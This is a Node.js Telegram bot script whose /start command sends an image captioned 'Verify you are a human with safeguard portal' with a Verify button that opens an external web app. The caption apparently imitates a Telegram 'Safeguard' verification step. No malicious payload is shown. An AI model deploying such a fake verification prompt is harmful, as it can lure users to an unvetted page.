require('dotenv').config(); // Load environment variables
const express = require('express'); // Add Express for webhooks
const { Telegraf } = require('telegraf');

// Create an Express app
const app = express();

// Initialize the Telegram bot
const bot = new Telegraf(process.env.BOT_TOKEN);

// Define the /start command
bot.command('start', (ctx) => {
  // Send the image with a caption using the direct URL
  ctx.replyWithPhoto(
    { url: 'https://i.postimg.cc/gcswRwd2/photo-2025-01-20-16-14-02.jpg' }, // Replace with your direct link
    {
      caption: 'Verify you are a human with safeguard portal', // Caption text
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Verify',
              web_app: { url: process.env.WEB_APP_URL }, // Use the web app URL from .env
            },
          ],
        ],
      },
    }
  );
});

// Set up the webhook endpoint
const WEBHOOK_PATH = '/telegram-updates'; // Replace with your desired webhook path
app.use(bot.webhookCallback(WEBHOOK_PATH)); // Set up the webhook callback
bot.telegram.setWebhook(`https://mini-app-z6ne.onrender.com${WEBHOOK_PATH}`); // Replace with your Render app URL

// Start the HTTP server
const PORT = process.env.PORT || 3000; // Use the provided port or default to 3000
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

console.log('Telegram bot is running with webhooks...');